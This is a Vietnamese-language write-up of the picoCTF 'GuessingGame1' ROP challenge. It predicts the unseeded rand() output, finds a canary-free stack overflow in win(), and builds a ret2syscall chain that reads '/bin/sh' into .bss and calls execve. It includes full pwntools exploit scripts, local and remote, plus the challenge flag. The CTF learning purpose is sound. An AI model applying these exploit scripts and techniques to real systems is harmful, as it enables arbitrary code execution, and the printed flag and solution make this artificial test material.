# GuessingGame1 - picoCTF Write-up

## Thông tin bài

- Dạng bài: Binary Exploitation / ROP
- Kiến trúc: amd64-64-little
- Binary: `vuln`
- Flag lấy được:

```text
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_5da5d9b398148a4f}
```

---

## Source code chính

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100

long increment(long in) {
    return in + 1;
}

long get_random() {
    return rand() % BUFSIZE;
}

int do_stuff() {
    long ans = get_random();
    ans = increment(ans);
    int res = 0;

    printf("What number would you like to guess?\n");
    char guess[BUFSIZE];
    fgets(guess, BUFSIZE, stdin);

    long g = atol(guess);
    if (!g) {
        printf("That's not a valid number!\n");
    } else {
        if (g == ans) {
            printf("Congrats! You win! Your prize is this print statement!\n\n");
            res = 1;
        } else {
            printf("Nope!\n\n");
        }
    }
    return res;
}

void win() {
    char winner[BUFSIZE];
    printf("New winner!\nName? ");
    fgets(winner, 360, stdin);
    printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    int res;

    printf("Welcome to my guessing game!\n\n");

    while (1) {
        res = do_stuff();
        if (res) {
            win();
        }
    }

    return 0;
}
```

---

## Kiểm tra bảo vệ

Chạy:

```bash
checksec vuln
```

Kết quả:

```text
[*] '/home/nguyenanninh-b23dcat231/GuessingGame1/vuln'
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Ý nghĩa:

- `Canary found`: binary có stack canary, nhưng chưa chắc hàm vulnerable có canary.
- `NX enabled`: không thể đặt shellcode lên stack rồi nhảy vào stack để chạy.
- `No PIE`: địa chỉ trong binary cố định, rất thuận lợi cho ROP.
- `Not stripped`: symbol còn nhiều, dễ tìm hàm như `read`.

Ban đầu nhìn thấy `Canary found` thì tưởng sẽ khó khai thác, nhưng cần kiểm tra kỹ hàm bị lỗi là `win()` có canary hay không.

---

## Phân tích bug

Trong `do_stuff()`:

```c
long ans = get_random();
ans = increment(ans);
```

Mà:

```c
long get_random() {
    return rand() % BUFSIZE;
}
```

`BUFSIZE = 100`, nên:

```text
ans = rand() % 100 + 1
```

Chương trình không gọi `srand()`, vì vậy giá trị `rand()` đầu tiên là cố định. Trên glibc, giá trị đầu tiên thường là:

```text
1804289383
```

Do đó:

```text
1804289383 % 100 = 83
83 + 1 = 84
```

Vì vậy chỉ cần nhập:

```text
84
```

là đi được vào hàm `win()`.

---

## Lỗi overflow trong `win()`

Hàm `win()`:

```c
void win() {
    char winner[BUFSIZE];
    printf("New winner!\nName? ");
    fgets(winner, 360, stdin);
    printf("Congrats %s\n\n", winner);
}
```

Ở đây:

```c
char winner[100];
```

nhưng lại đọc:

```c
fgets(winner, 360, stdin);
```

Tức là có thể ghi tối đa khoảng 359 byte vào buffer chỉ khoảng 100 byte. Đây là lỗi stack buffer overflow.

---

## Kiểm tra disassembly hàm `win()`

Disassemble:

```bash
objdump -d vuln | grep -A80 "<win>"
```

Kết quả quan trọng:

```asm
0000000000400c50 <win>:
  400c50: 55                    push   %rbp
  400c51: 48 89 e5              mov    %rsp,%rbp
  400c54: 48 83 ec 70           sub    $0x70,%rsp
  400c58: 48 8d 3d 88 24 09 00  lea    0x92488(%rip),%rdi
  400c5f: b8 00 00 00 00        mov    $0x0,%eax
  400c64: e8 97 f2 00 00        call   40ff00 <_IO_printf>
  400c69: 48 8b 15 38 9b 2b 00  mov    0x2b9b38(%rip),%rdx
  400c70: 48 8d 45 90           lea    -0x70(%rbp),%rax
  400c74: be 68 01 00 00        mov    $0x168,%esi
  400c79: 48 89 c7              mov    %rax,%rdi
  400c7c: e8 7f fc 00 00        call   410900 <_IO_fgets>
  400c81: 48 8d 45 90           lea    -0x70(%rbp),%rax
  400c85: 48 89 c6              mov    %rax,%rsi
  400c88: 48 8d 3d 6b 24 09 00  lea    0x9246b(%rip),%rdi
  400c8f: b8 00 00 00 00        mov    $0x0,%eax
  400c94: e8 67 f2 00 00        call   40ff00 <_IO_printf>
  400c99: 90                    nop
  400c9a: c9                    leave
  400c9b: c3                    ret
```

Không có đoạn:

```asm
mov    rax, QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8], rax
...
call   __stack_chk_fail
```

Vậy dù `checksec` báo `Canary found`, riêng hàm `win()` không có canary. Điều này cho phép ghi đè return address trực tiếp.

---

## Tính offset tới RIP

Trong `win()`:

```asm
sub    $0x70,%rsp
lea    -0x70(%rbp),%rax
```

Buffer `winner` bắt đầu tại:

```text
rbp - 0x70
```

Saved return address nằm tại:

```text
rbp + 0x8
```

Vậy offset từ đầu buffer tới RIP là:

```text
0x70 + 0x8 = 0x78 = 120
```

Offset đã được test và xác nhận là 120.

Payload kiểm tra cơ bản:

```python
payload = b"A" * 120
payload += p64(0xdeadbeefdeadbeef)
```

---

## Vì sao phải dùng ROP?

Do `NX enabled`, ta không thể:

```text
nhét shellcode vào stack rồi ghi return address trỏ về stack
```

Thay vào đó phải dùng các đoạn code có sẵn trong binary, gọi là gadget, để điều khiển thanh ghi và gọi syscall.

Ban đầu có thể nghĩ tới:

```text
system("/bin/sh")
```

Nhưng binary không có sẵn chuỗi `/bin/sh`:

```bash
strings -a -t x vuln | grep "/bin/sh"
```

Không có output.

Vì vậy hướng phù hợp hơn là:

```text
ret2syscall
```

Tức là tự gọi syscall:

```c
execve("/bin/sh", argv, NULL);
```

---

## Kiểm tra binary static

Chạy:

```bash
ldd vuln
```

Kết quả:

```text
not a dynamic executable
```

Binary là static, nên thường có rất nhiều gadget và có cả hàm `read` nằm sẵn trong binary.

---

## Tìm gadget

Chạy:

```bash
ROPgadget --binary vuln | grep -E "pop rdi ; ret|pop rsi ; ret|pop rdx ; ret|pop rax ; ret|syscall"
```

Các gadget dùng được:

```text
0x00000000004006a6 : pop rdi ; ret
0x0000000000410b93 : pop rsi ; ret
0x0000000000410602 : pop rdx ; ret
0x00000000004005af : pop rax ; ret
0x000000000040138c : syscall
```

Ý nghĩa:

- `pop rdi ; ret`: set tham số thứ nhất.
- `pop rsi ; ret`: set tham số thứ hai.
- `pop rdx ; ret`: set tham số thứ ba.
- `pop rax ; ret`: set số syscall.
- `syscall`: gọi syscall.

Với syscall trên amd64:

```text
rax = số syscall
rdi = tham số 1
rsi = tham số 2
rdx = tham số 3
```

---

## Hiểu về `pop rdi ; ret`

Ví dụ muốn gọi:

```c
system("/bin/sh");
```

Trên amd64, tham số đầu tiên phải nằm trong `rdi`.

Payload dạng:

```text
[pop rdi ; ret]
[địa chỉ "/bin/sh"]
[địa chỉ system]
```

Khi chạy:

```text
ret của hàm vulnerable -> nhảy tới pop rdi ; ret
pop rdi                -> lấy địa chỉ "/bin/sh" bỏ vào rdi
ret                    -> nhảy tới system
```

Với bài này không dùng `system`, nhưng ý tưởng ROP vẫn giống: dùng gadget để set thanh ghi rồi nhảy tới đoạn code mong muốn.

---

## Stack và thứ tự ROP chain

Một nhầm lẫn ban đầu là stack hoạt động LIFO, vậy tại sao payload lại viết theo thứ tự:

```text
[pop rdi ; ret]
[giá trị cho rdi]
[địa chỉ tiếp theo]
```

Lý do là payload overflow không phải là CPU `push` từng giá trị vào stack. `fgets()` ghi thẳng dữ liệu vào bộ nhớ từ địa chỉ thấp lên địa chỉ cao.

Trong `win()`:

```text
rbp-0x70    winner bắt đầu
...
rbp         saved rbp
rbp+0x8     saved return address
rbp+0x10    dữ liệu kế tiếp
rbp+0x18    dữ liệu kế tiếp
```

Payload:

```text
"A" * 120
[pop rdi ; ret]
[giá trị cho rdi]
[địa chỉ tiếp theo]
```

sẽ nằm như sau:

```text
rbp-0x70    AAAAA...
rbp         saved rbp bị đè
rbp+0x8     pop rdi ; ret
rbp+0x10    giá trị cho rdi
rbp+0x18    địa chỉ tiếp theo
```

Sau `leave; ret`, `rsp` trỏ tới `rbp+0x8`.

Lệnh `ret` gần giống:

```asm
pop rip
```

Tức là:

```text
rip = [rsp]
rsp = rsp + 8
```

Vì vậy ROP chain được đọc từ thấp lên cao, bắt đầu từ saved return address đã bị ghi đè.

---

## Ý tưởng exploit cuối cùng

Do không có chuỗi `/bin/sh` sẵn trong binary, ta cần ghi nó vào vùng nhớ ghi được, ví dụ `.bss`.

Kế hoạch:

```text
1. Gọi read(0, bss, 0x18)
   Đọc dữ liệu stage 2 vào .bss.

2. Dữ liệu stage 2 gồm:
   bss      = "/bin/sh\x00"
   bss + 8  = p64(bss)
   bss + 16 = p64(0)

3. Gọi execve(bss, bss + 8, 0)
```

Tại sao không gọi `execve(bss, 0, 0)`?

Một số môi trường vẫn chạy, nhưng có thể shell không ổn. Cách chuẩn hơn là truyền `argv`:

```c
execve("/bin/sh", ["/bin/sh", NULL], NULL);
```

Tức là:

```text
rdi = bss
rsi = bss + 8
rdx = 0
rax = 59
```

---

## Lần thử bị lỗi: dùng syscall để gọi read

Ban đầu thử chain:

```text
rax = 0
rdi = 0
rsi = bss
rdx = 8
syscall

rax = 59
rdi = bss
rsi = 0
rdx = 0
syscall
```

Mục tiêu là:

```c
read(0, bss, 8);
execve(bss, 0, 0);
```

Nhưng khi chạy, vào interactive thấy dấu `$`, gõ lệnh như `ls`, `pwd`, `id` lại không có output.

Nguyên nhân quan trọng: gadget tìm được chỉ là:

```asm
syscall
```

không phải:

```asm
syscall ; ret
```

Kiểm tra:

```bash
ROPgadget --binary vuln | grep "syscall ; ret"
```

Không có output.

Vì vậy sau khi syscall `read` chạy xong, chương trình không `ret` về ROP chain để chạy phần `execve`. CPU tiếp tục chạy lệnh sau địa chỉ `syscall` trong binary, khiến flow không đúng.

---

## Sửa lỗi: gọi hàm `read` thật

Vì binary static và còn symbol, tìm được hàm `read` thật:

```bash
nm -n vuln | grep -E " read$|__read$|__libc_read"
```

Output:

```text
000000000044a3e0 T __libc_read
000000000044a3e0 W __read
000000000044a3e0 W read
```

Vậy địa chỉ `read` là:

```text
read = 0x44a3e0
```

Khác với gadget `syscall`, hàm `read()` thật chạy xong sẽ `ret`, nên ROP chain có thể tiếp tục chạy tới phần `execve`.

---

## ROP chain cuối cùng

Phần 1: gọi `read(0, bss, 0x18)`:

```text
pop rdi ; ret
0
pop rsi ; ret
bss
pop rdx ; ret
0x18
read
```

Phần 2: gọi `execve(bss, bss + 8, 0)`:

```text
pop rax ; ret
59
pop rdi ; ret
bss
pop rsi ; ret
bss + 8
pop rdx ; ret
0
syscall
```

Stage 2 gửi vào `read`:

```text
/bin/sh\x00
p64(bss)
p64(0)
```

Bố cục `.bss` sau khi `read`:

```text
bss        -> "/bin/sh\x00"
bss + 8    -> argv[0] = bss
bss + 16   -> argv[1] = NULL
```

---

## Exploit local

```python
from pwn import *

context.binary = "./vuln"
context.arch = "amd64"

elf = ELF("./vuln")
p = process("./vuln")

offset = 120

pop_rdi = 0x4006a6
pop_rsi = 0x410b93
pop_rdx = 0x410602
pop_rax = 0x4005af
syscall = 0x40138c

read_addr = 0x44a3e0
bss = elf.bss() + 0x500

payload = b"A" * offset

# read(0, bss, 0x18)
payload += p64(pop_rdi)
payload += p64(0)

payload += p64(pop_rsi)
payload += p64(bss)

payload += p64(pop_rdx)
payload += p64(0x18)

payload += p64(read_addr)

# execve(bss, bss + 8, 0)
payload += p64(pop_rax)
payload += p64(59)

payload += p64(pop_rdi)
payload += p64(bss)

payload += p64(pop_rsi)
payload += p64(bss + 8)

payload += p64(pop_rdx)
payload += p64(0)

payload += p64(syscall)

p.sendlineafter(b"What number would you like to guess?", b"84")
p.sendlineafter(b"Name?", payload)

stage2 = b"/bin/sh\x00"
stage2 += p64(bss)
stage2 += p64(0)

p.send(stage2)

p.interactive()
```

Sau khi chạy local, shell hoạt động và có output bình thường.

---

## Exploit remote

Chỉ cần thay:

```python
p = process("./vuln")
```

thành:

```python
p = remote("HOST", PORT)
```

Script remote:

```python
from pwn import *

context.binary = "./vuln"
context.arch = "amd64"

elf = ELF("./vuln")

HOST = "saturn.picoctf.net"
PORT = 12345

p = remote(HOST, PORT)

offset = 120

pop_rdi = 0x4006a6
pop_rsi = 0x410b93
pop_rdx = 0x410602
pop_rax = 0x4005af
syscall = 0x40138c

read_addr = 0x44a3e0
bss = elf.bss() + 0x500

payload = b"A" * offset

# read(0, bss, 0x18)
payload += p64(pop_rdi)
payload += p64(0)

payload += p64(pop_rsi)
payload += p64(bss)

payload += p64(pop_rdx)
payload += p64(0x18)

payload += p64(read_addr)

# execve(bss, bss + 8, 0)
payload += p64(pop_rax)
payload += p64(59)

payload += p64(pop_rdi)
payload += p64(bss)

payload += p64(pop_rsi)
payload += p64(bss + 8)

payload += p64(pop_rdx)
payload += p64(0)

payload += p64(syscall)

p.sendlineafter(b"What number would you like to guess?", b"84")
p.sendlineafter(b"Name?", payload)

stage2 = b"/bin/sh\x00"
stage2 += p64(bss)
stage2 += p64(0)

p.send(stage2)

p.interactive()
```

Sau khi vào shell:

```bash
ls -la
cat flag.txt
```

Flag:

```text
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_5da5d9b398148a4f}
```

---

## Tổng kết

Các điểm chính của bài:

1. `rand()` không được seed bằng `srand()`, nên đoán số đầu tiên là `84` để vào `win()`.
2. Hàm `win()` có lỗi buffer overflow vì `winner[100]` nhưng `fgets(..., 360, ...)`.
3. `checksec` báo canary, nhưng hàm `win()` không có canary trong disassembly.
4. Offset tới RIP là `120`.
5. NX bật nên không dùng shellcode trên stack, phải dùng ROP.
6. Binary static, No PIE, nên địa chỉ gadget cố định và có nhiều gadget.
7. Không có chuỗi `/bin/sh` sẵn, nên dùng `read()` ghi `/bin/sh` và `argv` vào `.bss`.
8. Không có gadget `syscall ; ret`, nên không dùng syscall để gọi `read` trong stage đầu. Thay vào đó gọi hàm `read` thật tại `0x44a3e0`.
9. Cuối cùng gọi syscall `execve(bss, bss + 8, 0)` để lấy shell.

